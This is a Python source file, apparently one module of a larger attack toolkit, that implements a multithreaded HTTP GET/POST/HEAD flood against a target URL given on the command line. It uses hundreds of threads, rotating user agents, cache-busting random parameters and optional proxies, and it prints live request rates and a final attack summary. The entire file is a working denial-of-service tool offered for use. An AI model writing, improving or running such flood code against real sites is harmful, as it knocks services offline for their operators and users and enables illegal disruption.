#!/usr/bin/env python3
"""
HTTP Flood Attack Module
Method: Layer 7 HTTP GET/POST Flood
Author: AXMods
"""

import requests
import random
import time
import threading
import concurrent.futures
import urllib3
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils import get_random_user_agent, generate_random_string, print_status
from config import USER_AGENTS, HEADERS_TEMPLATE, TIMEOUT
from colorama import Fore, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HttpFlood:
    def __init__(self, target, port=80, threads=500, duration=60, use_https=False, proxy=None):
        """
        Initialize HTTP Flood Attack
        
        Args:
            target (str): Target URL or IP
            port (int): Target port
            threads (int): Number of concurrent threads
            duration (int): Attack duration in seconds
            use_https (bool): Use HTTPS instead of HTTP
            proxy (dict): Optional proxy configuration
        """
        # Clean target input
        self.target = target.strip()
        if not self.target.startswith(('http://', 'https://')):
            self.target = f"{'https' if use_https else 'http'}://{self.target}"
        
        # Remove trailing slash for consistency
        self.target = self.target.rstrip('/')
        self.port = port
        self.threads = threads
        self.duration = duration
        self.use_https = use_https
        self.proxy = proxy
        self.is_attacking = False
        self.request_count = 0
        self.error_count = 0
        
        # Parse target components
        from urllib.parse import urlparse
        parsed = urlparse(self.target)
        self.host = parsed.hostname
        self.base_path = parsed.path if parsed.path else '/'
        
        # Attack statistics
        self.stats_lock = threading.Lock()
        self.start_time = None
        
    def _send_get_request(self):
        """Send HTTP GET request with random parameters"""
        headers = HEADERS_TEMPLATE.copy()
        headers['User-Agent'] = get_random_user_agent()
        
        # Randomize parameters to avoid caching
        params = {
            'v': random.randint(1, 1000000),
            't': int(time.time()),
            'r': generate_random_string(8)
        }
        
        try:
            response = requests.get(
                f"{self.target}?{requests.compat.urlencode(params)}",
                headers=headers,
                timeout=TIMEOUT,
                verify=False,
                proxies=self.proxy,
                allow_redirects=True
            )
            
            with self.stats_lock:
                self.request_count += 1
                
            # Log every 100th request
            if self.request_count % 100 == 0:
                print_status(f"GET requests sent: {self.request_count}", Fore.CYAN)
                
        except Exception as e:
            with self.stats_lock:
                self.error_count += 1
            
    def _send_post_request(self):
        """Send HTTP POST request with random data"""
        headers = HEADERS_TEMPLATE.copy()
        headers['User-Agent'] = get_random_user_agent()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        # Generate random form data
        form_data = {}
        for i in range(random.randint(3, 10)):
            key = generate_random_string(random.randint(5, 15))
            value = generate_random_string(random.randint(20, 100))
            form_data[key] = value
            
        try:
            response = requests.post(
                self.target,
                headers=headers,
                data=form_data,
                timeout=TIMEOUT,
                verify=False,
                proxies=self.proxy,
                allow_redirects=True
            )
            
            with self.stats_lock:
                self.request_count += 1
                
            # Log every 100th request
            if self.request_count % 100 == 0:
                print_status(f"POST requests sent: {self.request_count}", Fore.MAGENTA)
                
        except Exception as e:
            with self.stats_lock:
                self.error_count += 1
    
    def _send_head_request(self):
        """Send HTTP HEAD request (lightweight)"""
        headers = HEADERS_TEMPLATE.copy()
        headers['User-Agent'] = get_random_user_agent()
        
        try:
            response = requests.head(
                self.target,
                headers=headers,
                timeout=TIMEOUT,
                verify=False,
                proxies=self.proxy,
                allow_redirects=True
            )
            
            with self.stats_lock:
                self.request_count += 1
                
        except Exception as e:
            with self.stats_lock:
                self.error_count += 1
    
    def _attack_worker(self, method='mixed'):
        """Worker thread for sending requests"""
        while self.is_attacking:
            if method == 'get':
                self._send_get_request()
            elif method == 'post':
                self._send_post_request()
            elif method == 'head':
                self._send_head_request()
            else:  # mixed
                choice = random.choice(['get', 'post', 'head'])
                if choice == 'get':
                    self._send_get_request()
                elif choice == 'post':
                    self._send_post_request()
                else:
                    self._send_head_request()
    
    def _stats_monitor(self):
        """Monitor and display attack statistics"""
        self.start_time = time.time()
        
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                rps = self.request_count / elapsed
                
                with self.stats_lock:
                    stats = (
                        f"Requests: {self.request_count:,} | "
                        f"Errors: {self.error_count:,} | "
                        f"RPS: {rps:.2f} | "
                        f"Elapsed: {elapsed:.1f}s"
                    )
                
                print_status(stats, Fore.YELLOW)
            
            time.sleep(1)
    
    def _resource_checker(self):
        """Check and report resource usage"""
        import psutil
        process = psutil.Process()
        
        while self.is_attacking:
            cpu_percent = process.cpu_percent()
            memory_mb = process.memory_info().rss / 1024 / 1024
            
            print_status(f"CPU: {cpu_percent:.1f}% | Memory: {memory_mb:.1f} MB", Fore.GREEN)
            time.sleep(5)
    
    def start(self, method='mixed'):
        """
        Start HTTP Flood attack
        
        Args:
            method (str): Attack method - 'get', 'post', 'head', or 'mixed'
        """
        if method not in ['get', 'post', 'head', 'mixed']:
            raise ValueError("Method must be 'get', 'post', 'head', or 'mixed'")
        
        print_status(f"Starting HTTP {method.upper()} Flood attack...", Fore.RED)
        print_status(f"Target: {self.target}", Fore.WHITE)
        print_status(f"Threads: {self.threads}", Fore.WHITE)
        print_status(f"Duration: {self.duration} seconds", Fore.WHITE)
        print_status("-" * 50, Fore.WHITE)
        
        self.is_attacking = True
        self.request_count = 0
        self.error_count = 0
        
        # Start statistics monitor
        stats_thread = threading.Thread(target=self._stats_monitor, daemon=True)
        stats_thread.start()
        
        # Start resource checker
        try:
            resource_thread = threading.Thread(target=self._resource_checker, daemon=True)
            resource_thread.start()
        except ImportError:
            print_status("psutil not installed, skipping resource monitoring", Fore.YELLOW)
        
        # Start attack threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            # Submit worker threads
            for _ in range(self.threads):
                future = executor.submit(self._attack_worker, method)
                futures.append(future)
            
            # Run for specified duration
            time.sleep(self.duration)
            
            # Stop attack
            self.is_attacking = False
            
            # Wait for threads to complete
            concurrent.futures.wait(futures, timeout=5)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        total_requests = self.request_count
        total_errors = self.error_count
        success_rate = ((total_requests - total_errors) / total_requests * 100) if total_requests > 0 else 0
        
        print_status("-" * 50, Fore.WHITE)
        print_status("ATTACK COMPLETED", Fore.RED)
        print_status(f"Total Requests: {total_requests:,}", Fore.GREEN)
        print_status(f"Total Errors: {total_errors:,}", Fore.YELLOW)
        print_status(f"Success Rate: {success_rate:.1f}%", Fore.CYAN)
        print_status(f"Average RPS: {total_requests/elapsed:.1f}", Fore.MAGENTA)
        print_status(f"Total Duration: {elapsed:.1f} seconds", Fore.WHITE)
        
        return {
            'total_requests': total_requests,
            'total_errors': total_errors,
            'success_rate': success_rate,
            'average_rps': total_requests/elapsed,
            'duration': elapsed
        }

# Standalone test function
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="HTTP Flood Attack Module")
    parser.add_argument("target", help="Target URL or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("-s", "--https", action="store_true", help="Use HTTPS")
    parser.add_argument("-m", "--method", choices=['get', 'post', 'head', 'mixed'], 
                       default='mixed', help="Attack method")
    
    args = parser.parse_args()
    
    print(f"[*] Starting HTTP Flood test against {args.target}")
    print(f"[*] Method: {args.method.upper()}")
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Duration: {args.duration}s")
    print("-" * 50)
    
    attack = HttpFlood(
        target=args.target,
        port=args.port,
        threads=args.threads,
        duration=args.duration,
        use_https=args.https
    )
    
    try:
        results = attack.start(method=args.method)
        print(f"\n[+] Attack completed successfully!")
    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
